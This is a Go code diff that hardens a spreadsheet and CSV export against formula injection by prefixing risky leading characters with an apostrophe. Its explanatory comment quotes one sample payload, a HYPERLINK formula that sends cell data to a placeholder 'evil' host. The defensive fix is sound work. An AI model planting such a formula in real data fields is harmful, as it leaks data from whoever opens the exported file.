@@ -29,12 +29,16 @@ func renderXLSX(cfg excelConfig, apps []dataexport.ApplicationSnapshot, progress
 		}
 	}
 
-	// Data rows.
+	// Data rows. SetCellStr (not SetCellValue) forces text-type cells, which
+	// already disables Excel formula interpretation. We additionally prefix
+	// dangerous leading characters via sanitiseSpreadsheetValue so the value
+	// is also safe when imported into LibreOffice or Google Sheets, which
+	// re-evaluate text cells under some import settings.
 	for rowIdx, app := range apps {
 		for colIdx, col := range cfg.Columns {
 			cell, _ := excelize.CoordinatesToCellName(colIdx+1, rowIdx+2) // +2: header is row 1
-			val := extractAndFormat(col, app)
-			if err := f.SetCellValue(sheet, cell, val); err != nil {
+			val := sanitiseSpreadsheetValue(extractAndFormat(col, app))
+			if err := f.SetCellStr(sheet, cell, val); err != nil {
 				return nil, fmt.Errorf("set data cell %s: %w", cell, err)
 			}
 		}
@@ -76,7 +80,7 @@ func renderCSV(cfg excelConfig, apps []dataexport.ApplicationSnapshot, progress 
 	row := make([]string, len(cfg.Columns))
 	for i, app := range apps {
 		for j, col := range cfg.Columns {
-			row[j] = extractAndFormat(col, app)
+			row[j] = sanitiseSpreadsheetValue(extractAndFormat(col, app))
 		}
 		if err := w.Write(row); err != nil {
 			return nil, fmt.Errorf("write csv row %d: %w", i, err)
@@ -105,4 +109,21 @@ func extractAndFormat(col columnConfig, app dataexport.ApplicationSnapshot) stri
 	}
 	raw := def.Extract(app)
 	return formatValue(raw, def.Type, col.Format, def.EnumLabels)
+}
+
+// sanitiseSpreadsheetValue defangs CSV/Excel-injection vectors. Values
+// starting with '=', '+', '-', '@', TAB or CR are interpreted as formulas
+// by Excel/LibreOffice; a leading apostrophe forces literal-text rendering.
+// See OWASP "CSV Injection". Applied uniformly to XLSX and CSV output so a
+// hostile member name like `=HYPERLINK("http://evil/?"&A2)` becomes a
+// harmless cell value when the admin opens the export.
+func sanitiseSpreadsheetValue(s string) string {
+	if s == "" {
+		return s
+	}
+	switch s[0] {
+	case '=', '+', '-', '@', '\t', '\r':
+		return "'" + s
+	}
+	return s
 }
